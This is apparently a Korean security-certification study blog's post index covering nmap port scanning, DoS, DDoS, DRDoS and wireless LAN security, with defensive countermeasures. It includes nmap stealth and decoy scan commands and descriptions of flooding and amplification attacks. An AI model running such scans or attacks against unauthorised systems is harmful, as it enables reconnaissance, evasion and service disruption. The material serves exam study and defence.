라우팅 경로의 효율성/우선순위, 클수록 비용이 큼       RX : Received (수신받음)       TX : Transmitted (전송)           Promiscuous 모드            설정 시 : ifconfig eth0 promisc                    UP BROADCAST RUNNING PROMISC MULTICAST                       로그파일                    /var/log/message                            시간 localhost kernel : device eth0 entered promiscuous mode                                               해제 시 : ifconfig eth0 -promisc                    UP BROADCAST RUNNING MULTICAST                       로그파일                    /var/log/message                            시간 localhost kernel : device eth0 left promiscuous mode                                                   nmap     개요            포트스캐닝 툴, 호스트나 네트워크를 스캐닝       시스템 보안 툴인 동시에 해킹 툴로 사용될 수 있음           예시            nmap -sP xxx.xxx.xxx.xxx : Ping Scan (ICMP)                    활성화 되어있으면 응답 받음                       nmap -sP -p 80 xxx.xxx.xxx.xxx : Port 옵션                    -pT:21,23,110,U:53 : TCP 21,23,110, UDP 53번 포트 스캔                       nmap -sT xxx.xxx.xxx.xxx : TCP Connection Open           옵션            -sT : 일반적 TCP 포트 스캐닝 (connect(open))       -sS : half open 스캔 (추적 어려움)       -sP : ping을 이용한 일반적인 스캔       -sU : UDP 포트 스캐닝       -sA : TCP ACK Scan       -sN : TCP Null Scan       -sF : TCP FIN Scan       -sX : TCP XMAS Scan       -PO : 대상 호스트에 대한 ping 응답을 요청하지 않음 (log 기록, filtering 회피)       -PT : 일반적인 ICMP ping이 아닌 ACK 패킷으로 ping을 보내고 RST 패킷으로 응답을 받음       -PI : 일반적인 ICMP ping 으로 방화벽이나 필터링에 의해 걸러짐       -PB : ping을 할 때 ICMP ping 과 TCP ping 을 동시에 이용       -PS : ping을 할 때 ACK 패킷 대신 SYN 패킷을 보내 스캔       -O : 대상 호스트의 OS 판별       -p : 대상 호스트의 특정 포트를 스캔하거나 스캔할 포트의 범위 지정 (1-1024)       -D : Decoy 기능으로 대상 호스트에게 스캔을 실행한 호스트의 주소를 속임       -F : /etc/services 파일 내에 기술된 포트만 스캔       -I : TCP 프로세서의 identd 정보를 가져옴       -n : IP 주소를 DNS 호스트명으로 바꾸지 않는다. 속도가 빠르다.       -R : IP 주소를 DNS 호스트명으로 바꿔서 스캔. 속도가 느리다.       -o : 스캔 결과를 텍스트 파일로 저장                    -oN : 스캔결과 파일로 출력           -oX : 스캔결과 XML로 출력           -oG : Grepable (grep, awk) 파일 형식으로 출력                       -i : 스캔 대상 호스트의 정보를 지정한 파일에서 읽어서 스캔       -h : 도움말 보기           TCP Connect(Open) 스캔     개요            connect() 함수를 이용하여 각 포트별로 접속, 스캔하는 방식       포트가 열린 상태이면 연결완료 후 종료       포트가 닫혀있으면 RST+ACT 패킷이 옴       시스템 로그가 남게 됨           과정            열려있는 경우                    Attacker : SYN 전송           Target : SYN+ACK 전송           Attacker : ACK 전송           Attacker : RST+ACK 전송                       닫혀있는 경우                    Attacker : SYN 전송           Target : RST+ACK 전송                       방화벽에 의한 차단                    Attacker : SYN 전송           Target                            무응답               ICMP 메시지 (Destination Unreachable)               filtered 메시지                                                   nmap            telnet, http 포트 확인 : nmap -sT -p 23,80 xxx.xxx.xxx.xxx           TCP SYN(Half-Open) 스캔     개요            관리자 권한을 가지고 있어야 수행 가능       완전 연결 설정과정을 수행하지 않기에 Half-Open(반 열림) 스캔이라 함       시스템 로그가 남지 않기 때문에 Stealth Scan 이라 함           과정            열려있는 경우                    Attacker : SYN 전송           Target : SYN+ACK 전송           Attacker : RST 전송                            원칙은 ACK 전송, 강제로 Control Flag 를 변경-관리자권한               UAPRSF (000100)                                               닫혀있는 경우와 방화벽 차단은 위와 동일           nmap            telnet, http 포트 확인 : nmap -sS -p 23,80 xxx.xxx.xxx.xxx           TCP FIN 스캔     개요            스텔스 스캔 방식의 하나       TCP 헤더의 flag 비트를 비정상적으로 설정해서 스캔하는 방식 (관리자권한)       TCP 표준의 허점을 이용                    포트 상태가 CLOSED 이면 요청 세그먼트에 대한 응답으로 RST 를 보낸다.           OPEN 상태이면 RST 가 오지 않음                           과정            열려있는 경우                    Attacker : FIN 전송           Target : 응답없음                       닫혀있는 경우                    Attacker : FIN 전송           Target : RST+ACK 전송                           nmap            telnet, http 포트 확인 : nmap -sF -p 23,80 xxx.xxx.xxx.xxx           TCP NULL 스캔     개요            스텔스 스캔 방식의 하나       연결되어 있지 않은 포트에 아무 플래그 비트를 설정하지 않은 탐지패킷 전송       열린 포트 : 응답이 없음       닫힌 포트 : RST+ACK 전송           과정            열려있는 경우                    Attacker : 패킷 전송 (No Flag) - UAPRSF (000000)           Target : 응답 없음                       닫혀있는 경우                    Attacker : 패킷 전송 (No Flag) - UAPRSF (000000)           Target : RST+ACK 전송                           nmap            telnet, http 포트 확인 : nmap -sN -p 23,80 xxx.xxx.xxx.xxx           TCP Xmas 스캔     개요            스텔스 스캔방식의 하나       여러가지 플래그를 활성화 해 전송       연결되어 있지 않은 포트에 FIN, URG, PSH 플래그 비트를 설정하여 탐지패킷 전송                    UAPRSF : 101001                       열린 포트 : 응답이 없음       닫힌 포트 : RST+ACK 전송           과정            열려있는 경우                    Attacker : FIN+URG+PSH 플래그 전송 (UAPRSF - 101001)           Target : 응답 없음                       닫혀있는 경우                    Attacker : FIN+URG+PSH 플래그 전송 (UAPRSF - 101001)           Target : RST+ACK 전송                           nmap            telnet, http 포트 확인 : nmap -sX -p 23,80 xxx.xxx.xxx.xxx           TCP ACK 스캔     개요            포트의 Open 여부보다는 방화벽의 필터링 방식을 확인하기 위함           방화벽 필터링 방식            Packet Filtering (패킷 필터링) 방화벽                    deny, allow                            IP 주소 (소스, 목적지)               포트번호 (소스, 목적지)               트래픽 방향               프로토콜의 형태                                   전송 / 네트워크 계층 차단 방식                            TCP/IP 헤더 부분을 이용한 침입차단               수동적 방화벽                                   응용 계층 차단 (응용 게이트웨이) 방식                            프록시 (소프트웨어) 기능을 이용                                    패킷의 IP 주소와 서비스 종류에 따라 내부 네트워크 보호                                               능동적 방화벽                                               Stateful Inspection (상태기반) 방화벽                    패킷 필터링 방화벽과 마찬가지로 동일한 패킷정보 검토                            SYN 패킷인 경우                                   상태 테이블 관리                            TCP 연결에 관한 정보를 기록               TCP 번호 추적                                   DataLink 계층에서 상태 테이블을 확인하고, 허용된 패킷만 통과시킴                            SYN 패킷이 아닌 경우                                               NAT (Network Address Translation) 를 이용한 방화벽           과정            필터링 하는 경우                    응답 없음 (Stateful Inspection 방화벽 가능성이 높음)           ICMP 메시지                       필터링 하지 않는 경우                    RST + ACK 패킷                           UDP 스캔     개요            ICMP Unreachable 메시지를 이용하여 UDP 포트 오픈 여부 확인       열린 포트 : UDP 응답 or 응답 없음       닫힌 포트 : ICMP 메시지 응답           과정            열려있는 경우                    Attacker : UDP           Target : UDP 응답 or 응답 없음                       닫혀있는 경우                    Attacker : UDP           Target : ICMP Unreachable (Type : 3, Code : 3)                           nmap            DNS 서비스 UDP 스캔 : nmap -sU -p 53 xxx.xxx.xxx.xxx       NTP 서비스 UDP 스캔 : nmap -sU -p 123 xxx.xxx.xxx.xxx           Decoy 스캔     개요            위조된 주소로 스캔하는 방식       다양한 IP로 스캐너 주소를 위조, 관리자가 누가 스캔하는지 알아채기 어려움           nmap            nmap -sS -p 23,80 192.168.120.100 -D 192.168.150.1, 192.168.150.2                    src – SYN –&gt; 192.168.120.100:23/80           192.168.150.1 – SYN –&gt; 192.168.120.100:23/80 (Decoy)           192.168.150.2 – SYN –&gt; 192.168.120.100:23/80 (Decoy)                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크"],
        "url": "https://bluesplatter.com/is_certification/IS-Network-Port-Scan/",
        "teaser": null
      },{
        "title": "정보보안 - 네트워크 DoS",
        "excerpt":"DoS (Denial of Service) 공격     개요            대상 시스템이 정상적인 서비스를 할 수 없도록 만드는 공격 (서비스 거부 공격)       가용성(Availability)을 떨어뜨리는 공격       공격 유형                    파괴공격 : 디스크, Data, System           시스템 자원 소진 공격 : CPU, 메모리, 디스크           네트워크 자원 소진 공격 : 네트워크 대역폭 (BandWidth)                       DoS 와 DDoS                    DoS : 단일 컴퓨터를 통해 공격           DDoS : 다수의 컴퓨터를 통해 공격 (Distributed)                       종류                    Ping Of Death Attack                            개요                                    IP 패킷은 단편화 (Fragment) 를 수행                   MTU 1500 bytes (Ethernet)                   단편화 후 전송, 수신측은 Reassembly 진행                   Ping : ICMP 프로토콜                                               원리 (이더넷 기준)                                    ICMP 패킷(ping) 을 아주 크게 만듦                   MTU =&gt; fragment 발생                   IP 헤더 20bytes 제외 1480 bytes                   수신 측 재조합 과정에서 재조합 버퍼의 overflow 발생                                               과정                                    Attacker : ping 패킷 전송                                            용량이 매우 큰 ICMP 패킷                       단편화 발생                                                           Target : 대량의 IP fragment 수신                                            재조합 buffer 가 과부하 발생                                                                                       대응책                                    일반적으로 ICMP 패킷은 분할이 될 정도로 크지 않음                   분할이 일어난 패킷 탐지, 공격 의심                   반복적으로 들어오는 경우 ICMP 패킷 무시하도록 설정                                               예시                                    Ping of Death 공격                                            Fragmented proto=ICMP offset=0 ID=1                       Fragmented proto=ICMP offset=1480 ID=1                       Fragmented proto=ICMP offset=2960 ID=1                       Fragmented proto=ICMP offset=4440 ID=1                                                                                                           Land Attack                            개요                                    SRC IP 와 DST IP 를 동일하게 해서 패킷 전송                   수신자는 자신에게 응답을 보내게 되어 시스템 가용성 침해                   방화벽이나 시스템에서 출발지와 목적지가 같으면 패킷 폐기                   이론상으로만 존재 (현재는 차단)                                               과정                                    Attacker (192.168.150.1)                                            SRC IP : 192.168.150.1 192.168.100.10(위조)                       DST IP : 192.168.100.10                                                           Target (192.168.100.10)                                               대응책                                    방화벽에서 Drop                   동일 SRC IP, DST IP 는 Drop                                               예시                                    ICMP 패킷 =&gt; Echo Request                                                                   Smurf Attack                            개요                                    Broadcast                                            해당 라우터 아래 내부 네트워크 호스트에게 한꺼번에 패킷을 보냄                       목적지 주소 : 네트워크 주소를 제외한 Client IP의 주소를 255로 설정 (다이렉트 브로드캐스트)                       라우터 범위 밖을 넘어가지 않음                                                           공격자가 다이렉트 브로드캐스트를 이용해 공격                                            증폭 네트워크의 라우터의 브로드캐스트 기능이 활성화되어 있어야 함                                                                                       원리                                    공격자가 SRC IP를 희생자 IP 롤 위조                   ICMP Echo Request 를 브로드캐스팅으로 전송                   라우터 아래 내부 네트워크 호스트들이 Echo Reply 를 희생자 IP로 전송                                            증폭 네트워크 (Bounce Network)                                                                                       과정                                    Attacker (192.168.100.200)                   Target (192.168.100.10)                   Amplifier(Bounce) Network (192.168.200.255) : 여러 호스트들                   Attacker : ICMP Echo Request 전송 (ping)                                            SRC IP : 192.168.100.10 (Victim)                       DST IP : 192.168.200.255                                                           Amplifier(Bounce) Network : ICMP Echo Reply 전송 (ping)                                            DST IP : 192.168.100.10 (Victim)                                                                                       대응책                                    단시간에 다량의 ICMP Echo Reply 패킷이 생성이 되면 침입차단시스템을 통해서 Drop을 시킴                   Bounce(Amplifier) Network 차단                                            라우터 : 다른 네트워크로부터 자신의 네트워크로 들어오는 Direct Broadcast 패킷 차단                                                    라우터 명령어 : (config-if)#no ip directed-broadcast                                                                                                           ICMP Echo Request 에 대해 응답하지 않도록 설정                                                                   Teardrop Attack                            개요                                    fragment offset 정보를 이용한 DoS                   IP 패킷의 reassembly 과정에서의 문제를 이용                   fragment offset 값이 중첩되도록 조작                   공격종류 : Bonk, Boink                                                                   IP Fragmentation  취약점을 이용한 침입차단시스템 우회공격                            Tiny Fragment (DoS 아닌 우회공격)                                    원래 Fragment 보다 작게 IP Header 를 조작, 공격                                               Fragment Overlap (DoS)                                    Offset 값 조작                   서비스 포트의 필드를 중첩시켜 방화벽이 허용하지 않는 서비스에 접근하는 공격기법                                                                                  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크"],
        "url": "https://bluesplatter.com/is_certification/IS-Network-DoS/",
        "teaser": null
      },{
        "title": "정보보안 - 네트워크 DDoS",
        "excerpt":"DDoS (Distributed Denial of Service) 공격     개요            분산서비스공격                    네트워크 자원 소진 : BandWidth 소진           시스템 자원 소진 : 서비스/서버 자원 소진                       분산된 다수의 좀비 PC에 의해 공격대상 시스템의 서비스를 마비시키는 공격           공격 구조            Attacker(공격자) : C&amp;C 서버에 공격 명령을 전달하는 해커 (Bot Master)       Botnet(봇넷) : 악의적 의도를 갖는 불법 네트워크                    C&amp;C (명령제어) 서버 : 공격 명령을 전달받고 좀비 PC에 명령을 전달하는 시스템 (Master)                            중앙집중형 (C&amp;C 서버만 발견되면 전체 무효화)                                    IRC 봇넷 (Rbot) (초창기)                                            IRC (Internet Replay Chat) : 인터넷에서 채팅을 할 수 있는 프로토콜                       IRC 서버간에 연결 (전 세계 모든 서버)                       IRC 서버를 C&amp;C 서버로 주로 활용                                                           HTTP 봇넷 (Robax) (탐지, 대응이 어려움)                                               분산형 (탐지, 차단 어려움)                                    P2P 봇넷 (Storm, Peacomm)                                            공격자 (Bot Master) 가 P2P 중 하나에 명령 전송                       봇넷 내 Host 끼리 명령을 전파시킴l                                                                                                           좀비 PC (악성 봇) : C&amp;C 서버로부터 전달받은 명령을 수행(실제 공격) 하는 시스템 (Bot, Slave, Agent)                            봇 프로그램에 감염된 PC               봇(Bot)                                    웜/바이러스, 백도어, 스파이웨어, 루트킷                   원격에서 해당 System을 제어하는 프로그램                   정보유출, 스팸메일발송, DDoS 공격                   타 PC 감염                                                                               공격대상 : 피해 시스템 (Target, Victim)           DNS 싱크홀 서비스     개요            한국인터넷진흥원 (KISA) 에서 싱크홀 서비스 운영       DDoS 공격 구조                    Zombie PC : C&amp;C 서버 도메인으로 DNS 서버에 질의 (C&amp;C 서버 IP 필요)           DNS 서버 : C&amp;C 서버 IP 주소 전송           Zombie PC : C&amp;C 서버 접속           C&amp;C 서버 : 명령                       DNS 싱크홀 (Sinkhole) 서비스                    C&amp;C 서버 도메인 목록 제공 서버 : DNS 서버에 목록 제공           Zombie PC : C&amp;C 서버 도메인으로 DNS 서버에 질의 (C&amp;C 서버 IP 필요)           DNS 서버 : 싱크홀 서버 IP 주소 전송           Zombie PC : 싱크홀 서버 접속                           DDoS 공격 유형     유형별 분류            네트워크 대역폭 소진 공격 (네트워크 계층, 전송 계층) -&gt; 네트워크 인프라 장애, 다른 정상 Client 접속 X                    UDP Flooding : SRC IP 위조, 전송 계층           ICMP Flooding : SRC IP 위조, 네트워크 계층, Echo Request (Ping)           DNS Query Flooding : DNS Query Data 를 서버에 대량전송, DNS 서버에서 서비스를 받는 호스트에 타격           IP Flooding           TCP SYN Flooding : 3-Way Handshake 의 취약점 이용, 대량의 SYN 패킷을 서버에 전송, 대기큐 (Backlog Queue) 를 소진                            출발지 주소를 위조하여 SYN 전송, SYN + ACK 를 서버에서 보내도 ACK 가 오지 않기 때문에 Incomplete Connection Queue 가 소진됨               Listen : Backlog Queue 에 메세지를 받는 상태                                    Backlog Queue ( Incomplete Connection Queue + Complete Connection Queue )                                            Incomplete Connection Queue : 서버에 SYN 요청이 들어오면 쌓이게 됨 (SYN-RECV)                       Complete Connection Queue : 연결요청이 완료 (3Way Handshake) 되면 또 다른 Queue 에 쌓임                       Complete Connection Queue 의 대기 Queue를 System Call (accept()) 하여 Connected Socket이 되고, Queue 에서 삭제                                                                                       현재 소켓 상태를 파악하기 위한 명령어                                    netstat -antp | grep SYN RECV : InComplete Connection Queue 의 리스트를 확인                                               해결책                                    Syn Cookie 설정                                            리눅스 # sysctl -w net.ipv4.tcp_syncookies=1 : 1=true                       Backlog Queue (Incomplete Connection Queue) 가 소진되지 않도록 설정                       유효한 클라이언트인지 판단                       연결 설정 과정에서 서버가 특정값 (쿠키값) 을 설정 - ISN                                                    SYN+ACK 에 설정                                                                       ACK 에 ISN 이 실리지 않으면 Backlog Queue 에서 제거                                                           방화벽 이용                                            연결 요청 (동일 Client IP에서 발생) 에 대한 임계치 값 (SYN 요청 Threshold) 설정                       iptables –A INPUT –p tcp —syn —dport 80 –m connlimit —connlimit –above 5 –j DROP                                                           첫번째 SYN DROP                                            첫번째 SYN 패킷을 보낸 SRC IP가 존재하는지 확인                                                    DROP 을 시켜 확인 : 재요청 패킷이 도착하는지 확인(실제 IP 존재)                                                                                                           Backlog Queue 크기 늘리기 (임시적 조치)                                            리눅스 # sysctl -w net.ipv4.tcp_max_syn_backlog=1024                       솔라리스 # ndd -set /dev/tcp tcp_conn_req_max_q0 1024;                                                           SYN + ACK 에 대한 대기시간 줄이기                                                                   TCP Flag Flooding : Flag값 (UAPRSF) 을 재멋대로 설정하여 전송, 서버에서 검증에 자원을 소모           TCP SYN + ACK Flooding                       서비스(어플리케이션) 마비 공격 -&gt; 공격대상 시스템만 피해                    HTTP Traffic Flooding                            HTTP Get Flooding                                    동일한 HTTP Get 요청을 다량으로 발생시킴 &gt; 웹서버 자원 소모                   Botnet의 ZombiePC 들이 동일 URL 로 GET 요청을 전송                                               HTTP Get Flooding with CC Attack : 캐싱 서버 무력화, 웹서버에 부하               Hulk DoS                                    URL 을 변경해가며 (차단-임계치기반 을 피해가며) 공격                                            임계치 우회 : 동일 URL에 대한 접근횟수 제한                                                                                                           HTTP Header/Option Spoofing                            HTTP Continuation : HTTP Header 없이 Data 만 채워 웹서버에 전송 &gt; 웹서버는 데이터가 더 있다고 생각하고 지속적으로 TCP 자원을 사용               Slow HTTP POST DoS : HTTP POST 메소드 이용, 대량의 데이터를 장시간에 걸쳐 분할 전송 &gt; 서버는 수신이 다 될때까지 세션을 유지, 자원소모                                    RUDY 공격                   Content-Length 헤더 필드의 값을 비정상적으로 크게 설정                   소량의 데이터를 지속적으로 천처히 보냄                   웹서버는 정해진 크기만큼 데이터를 모두 수신하기 위해 연결상태 유지                   웹 서버의 연결자원을 모두 소진                   대응책                                            동시연결 임계치 설정 (Concurrent Connection Threshold)                                                    iptables                                                                       Connection timeout 설정                                                    Apache httpd.conf =&gt; timeout=120초 (기본값) -&gt; 5초                                                                       Read Timeout 설정 (Apache 2.2 이상)                                                    Apache httpd.conf =&gt; RequestReadTimeout body=10                                                            body 부가 10초 이내에 수신되지 않으면 오류                                                                                                                                                                                               Slow HTTP Header DoS : 헤더와 데이터부의 구분 라인을 모호하게 함. &gt; 서버는 아직 헤더정보가 남아있다고 판단, Header 의 나머지 부분 전송 대기, 연결 유지                                    Slowloris 공격                   헤더의 마지막을 알리는 Empty line을 보내지 않아 웹서버를 대기시킴                   웹서버와의 연결상태를 지속, 저대역폭 공격 (소량의 트래픽을 이용)                   HTTP 헤더의 구조                                            Request Line : 요청라인                                                    Method (GET, POST …) 지정                           URL (/home/aa.php)                           HTTP Version (HTTP/1.1)                           개행값 (CRLF - Carriage Return ( 행 맨 앞으로 커서 이동) Line Feed (다음 행으로 이동) : 0x0d0a &lt; 0d0a)                                                                       Request Header : 요청헤더                                                    Host : 호스트명                           개행값 (CRLF)                           User-Agent : 사용 브라우저 정보                           개행값 (CRLF)                           …                           개행값 (CRLF)                           헤더 필드                           개행값 (CRLF)                                                                       Empty Line : 공백라인                                                    헤더를 구분하기 위해 빈 라인 추가                           개행값 (CRLF)                                                                       Body (Data) : 데이터                                                           대응책                                            동시연결 임계치 설정 (Concurrent Connection Threshold)                                                    iptables                                                                       Connection timeout 설정                                                    Apache httpd.conf =&gt; timeout=120초 (기본값) -&gt; 5초                                                                       Read Timeout 설정 (Apache 2.2 이상)                                                    Apache httpd.conf =&gt; RequestReadTimeout header=5                                                            header 부가 5초 이내에 수신되지 않으면 오류                                                                                                                                                                                               Slow HTTP Read DoS : 서버와 연결할 때 TCP 윈도우 크기, 데이터 처리율을 감소 시킨 후 HTTP 송신                                    TCP 흐름제어 (Flow Control) 특성을 이용                   HTTP 요청을 보냔 후 Windows 크기를 조작하여 Zero Window Packet을 지속적으로 서버에 전달                   연결 상태를 지속적으로 유지시키는 공격                   TCP Flow Control (흐름제어)                                            3 Way-handshake 완료 후                       Client : ESTABLISHED                       Server : ESTABLISHED                       Data 전송                       Client 수신버퍼 / Server 송신버퍼                       Flow Control : 수신 측이 받을 수 있는 용량만큼 크기 조절                       Client 수신버퍼가 Full : 필드 window=0 설정, Zero Window Packet 송신                       일정시간 경과 ( Server : Slow Read )                       Server 에서 ACK, Zero Window Probe Packet 전송 (상태확인용)                       Free 상태일 경우                                                    Client : 필드 window=200 설정, Window Update Packet 송신                           Server : 송신버퍼에 있는 데이터를 수신 window size에 맞춰 전송                                                                       Full 상태일 경우                                                    Client : 필드 window=0 설정, Zero Window Packet 송신                                                                                                           공격자는 window 크기를 조작, Zero Window Packet 을 지속적으로 전송                                               Hash DoS : 웹서버는 파라미터 관리를 위해 해시테이블 사용. 조작된 파라미터 정보를 포함한 다량의 정보를 전송해 해시값의 충돌을 유도 &gt; 웹서버는 해시값 검색에 CPU 자원을 소모하게 됨                                    Hash Table (Key:Value 자료구조) &gt; 속도에 유리                                            Hash Function : 평문 =&gt; Function =&gt; 짧은 Msg                       Hashing : Hash Table + Hash Function                       Key (예:aaabbb) 를 Hash Function 으로 짧은 값으로 만든 뒤 (예:00) &gt; 00에 해당하는 Bucket 공간에 값을 저장                       문제점 : 입력 값은 무한한데, Hash 값은 유한함 &gt; 충돌 발생                                                    Hash 충돌을 최소화 시키는 Hash 함수를 이용해야 함                                                                       Bucket 에는 주소값이 들어가 있음 (Linked List)                                                    해당 주소에 변수명과 값이 저장되며 충돌이 발생했을 경우 또 다른 Linked List 에 연결됨 &gt; 체이닝 기법                           CPU 자원소모                                                                       파라미터 (매개변수): GET index.php?aaa=123&amp;bbb=100 &gt; aaa, bbb…                                                    GET 방식은 길이 제한이 있기 때문에 HashDos 공격 어려움                           POST 방식은 많은 매개변수를 한꺼번에 전달 가능                                                            Hash 충돌 발생                                                                                                                                                                   대응책                                            최신 패치                                                                                                           TCP Traffic Flooding (TCP Session, SYN Flooding, TCP Slow Read)                            TCP Session Flooding : 3Way-Handshake 과정을 지나치게 많이 발생시킴                                   L7 Service Flooding (Hash DoS, Hulk DoS, FTP/SMTP Attack)                           UDP Flooding 공격            다량의 UDP 패킷을 서버로 전송       서버가 보유한 네트워크 대역폭을 소진       정상적인 클라이언트의 접속을 하지 못하도록 함           ICMP Flooding 공격            다량의 ICMP 패킷을 서버로 전송       서버가 보유한 네트워크 대역폭을 소진       정상적인 클라이언트의 접속을 하지 못하도록 함           ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크"],
        "url": "https://bluesplatter.com/is_certification/IS-Network-DDoS/",
        "teaser": null
      },{
        "title": "정보보안 - UDP Flooding",
        "excerpt":"DDoS (Distributed Denial of Service) 공격     개요            분산서비스공격                    네트워크 자원 소진 : BandWidth 소진           시스템 자원 소진 : 서비스/서버 자원 소진                       분산된 다수의 좀비 PC에 의해 공격대상 시스템의 서비스를 마비시키는 공격           공격 구조            Attacker(공격자) : C&amp;C 서버에 공격 명령을 전달하는 해커 (Bot Master)       Botnet(봇넷) : 악의적 의도를 갖는 불법 네트워크                    C&amp;C (명령제어) 서버 : 공격 명령을 전달받고 좀비 PC에 명령을 전달하는 시스템 (Master)                            중앙집중형 (C&amp;C 서버만 발견되면 전체 무효화)                                    IRC 봇넷 (Rbot) (초창기)                                            IRC (Internet Replay Chat) : 인터넷에서 채팅을 할 수 있는 프로토콜                       IRC 서버간에 연결 (전 세계 모든 서버)                       IRC 서버를 C&amp;C 서버로 주로 활용                                                           HTTP 봇넷 (Robax) (탐지, 대응이 어려움)                                               분산형 (탐지, 차단 어려움)                                    P2P 봇넷 (Storm, Peacomm)                                            공격자 (Bot Master) 가 P2P 중 하나에 명령 전송                       봇넷 내 Host 끼리 명령을 전파시킴l                                                                                                           좀비 PC (악성 봇) : C&amp;C 서버로부터 전달받은 명령을 수행(실제 공격) 하는 시스템 (Bot, Slave, Agent)                            봇 프로그램에 감염된 PC               봇(Bot)                                    웜/바이러스, 백도어, 스파이웨어, 루트킷                   원격에서 해당 System을 제어하는 프로그램                   정보유출, 스팸메일발송, DDoS 공격                   타 PC 감염                                                                               공격대상 : 피해 시스템 (Target, Victim)           DNS 싱크홀 서비스     개요            한국인터넷진흥원 (KISA) 에서 싱크홀 서비스 운영       DDoS 공격 구조                    Zombie PC : C&amp;C 서버 도메인으로 DNS 서버에 질의 (C&amp;C 서버 IP 필요)           DNS 서버 : C&amp;C 서버 IP 주소 전송           Zombie PC : C&amp;C 서버 접속           C&amp;C 서버 : 명령                       DNS 싱크홀 (Sinkhole) 서비스                    C&amp;C 서버 도메인 목록 제공 서버 : DNS 서버에 목록 제공           Zombie PC : C&amp;C 서버 도메인으로 DNS 서버에 질의 (C&amp;C 서버 IP 필요)           DNS 서버 : 싱크홀 서버 IP 주소 전송           Zombie PC : 싱크홀 서버 접속                           DDoS 공격 유형     유형별 분류            네트워크 대역폭 소진 공격 (네트워크 계층, 전송 계층) -&gt; 네트워크 인프라 장애, 다른 정상 Client 접속 X                    UDP Flooding           ICMP Flooding           DNS Query Flooding : DNS Query Data 를 서버에 대량전송, DNS 서버에서 서비스를 받는 호스트에 타격           IP Flooding           TCP SYN Flooding : 대량의 SYN 패킷을 서버에 전송, 대기큐 (Backlog Queue)           TCP Flag Flooding : Flag값 (UAPRSF) 을 재멋대로 설정하여 전송, 서버에서 검증에 자원을 소모           TCP SYN + ACK Flooding                       서비스(어플리케이션) 마비 공격 -&gt; 공격대상 시스템만 피해                    HTTP Traffic Flooding                            HTTP Get Flooding : 웹서버 자원 소모               HTTP Get Flooding with CC Attack : 캐싱 서버 무력화, 웹서버에 부하                                   HTTP Header/Option Spoofing                            HTTP Continuation : HTTP Header 없이 Data 만 채워 웹서버에 전송 &gt; 웹서버는 데이터가 더 있다고 생각하고 지속적으로 TCP 자원을 사용                                   TCP Traffic Flooding (TCP Session, SYN Flooding, TCP Slow Read)                            TCP Session Flooding : 3Way-Handshake 과정을 지나치게 많이 발생시킴                                   L7 Service Flooding (Hash DoS, Hulk DoS, FTP/SMTP Attack)                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크"],
        "url": "https://bluesplatter.com/is_certification/UDP-Flooding/",
        "teaser": null
      },{
        "title": "정보보안 - 네트워크 DDoS",
        "excerpt":"DRDoS (Distributed Reflection Denial of Service) 공격     개요            공격자는 출발지 IP를 공격대상의 IP 로 위조 (IP Spoofing) 함.       다수의 반사서버(Reflector) 로 요청정보를 전송                    DDoS 의 Zombie PC 이용이 아닌 정상적인 서버를 이용                       공격대상은 반사서버로부터 다수의 응답을 받아 서비스 거부 상태가 됨.           DoS 공격과의 차이점            공격 근원지 파악이 어려움       좀비 PC 이용에 비해 공격 효율성이 좋음                    Victim으로부터 SYN+ACK 에 대한 응답이 없을 경우 일정 횟수 재전송을 함.                           DRDoS 의 공격 형태            3 way-handshake 의 취약점 이용                    정상적인 TCP서버들 또는 라우터를 활용           소스 IP를 Victim IP 로 위조하여 SYN 패킷 전송           정상적인 TCP 서버에서 SYN+ACK 을 Victim 에게 전송                       ICMP 프로토콜의 Echo Request 와 Echo Reply 를 이용                    정상적인 반사 서버를 이용           소스 IP를 Victim IP 로 위조하여 Echo Request 패킷 전송           정상적인 서버에서 Echo Reply 을 Victim 에게 전송                       UDP 프로토콜 서비스를 제공하는 서버를 반사서버로 이용하는 방법                    대표적인 방법, 응답메시지 증폭 (대량의 트래픽 생성)           유형                            DNS : DNS 질의 시 타입:ANY,TXT 등과 같이 많은 양의 레코드 정보 제공을 요구하여 공격대상자에게 대형 트랙픽 유발               NTP : NTP (Network Time Protocol) 서버에 최근 접속한 클라이언트 목록을 요청 (monlist) 하여 공격대상자에게 대량 트래픽 유발               SNMP : SNMP Agent 에 MIB와 같은 정보를 대량 요청(GetBulkRequest) 하여 공격대상자에게 대량 트래픽 유발               CHARGEN : CHARGEN (Character Generate) 서버에 접속시 대량의 문자열(abcd…) 전송을 유도하여 공격대상자에게 대량 트래픽 유발                                                   대응책            Ingress Filtering : IP 가 위조된 패킷 차단       반사서버에서 ICMP 프로토콜 차단       DNS (Resolving)                    내부사용자 주소만 쿼리           동일 IP에 대한 초당 요청개수 제한           응답 정보량을 제한 (방화벽 또는 네트워크 보안장비)                       NTP 서버의 경우 monlist 명령 해제          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크"],
        "url": "https://bluesplatter.com/is_certification/IS-Network-DRDoS/",
        "teaser": null
      },{
        "title": "정보보안 - 무선랜(Wireless LAN) 보안",
        "excerpt":"무선 네트워크 유형     WPAN : Wireless Personal Area Network            별도의 무선장비가 필요없음                    Bluetooth           USN (Ubiquotous Sensor Network)                       소규모 무선 네트워크       단거리 네트워크           WLAN : Wireless Local Area Network            근거리 네트워크                    학교, 회사                       안전 관리가 중요           WMAN : Wireless Metropolitan Area Network            도시규모 네트워크       IEEE 802.16 표준 사용                    WiMAX &gt; Mobile WiMAX = Wibro                           무선랜 표준     802.11 (1997) : 주파수 대역 2.4GHz, 속도 20~100MBps            전송방법 &gt; ISM : Industrial Scientific Medical 3 종류       암호화방식                    WEP                            무선 AP 와 단말기 간 송수신               공유 비밀키와 IV (초기벡터) 를 이용, 64 or 128 Bit 암호화                                                   802.11a (1999) : 주파수 대역 5GHz, 속도 35~120MBps            주파수가 다르므로 타 방식과 호환 X                    Bluetooth 등의 간섭을 받지 않음 &gt; 통신위성 등이 사용                           802.11b (1999) : 주파수 대역 2.4GHz, 속도 38~140MBps   802.11g (2003) : 주파수 대역 2.4GHz, 속도 38~140MBps            가장 많이 사용           802.11i (2004) : 가장 보안상 안전한 방식으로 알려짐            무선장비와 단말기 간의 가상인증기능 (EAP) 을 제공                    Extensible Authentication Protocol                       인증과 데이터 암호화 강화       WPA                    WPA 개인 &gt; PSK 모드                            PSK : 인증서버 설치 X &gt; 소규모               CCMP 암호화 (WPA-2)                                    128Bit AES 블록 암호화                   Counter Mode, CBC MAC Mode 이용                                                                   WPA 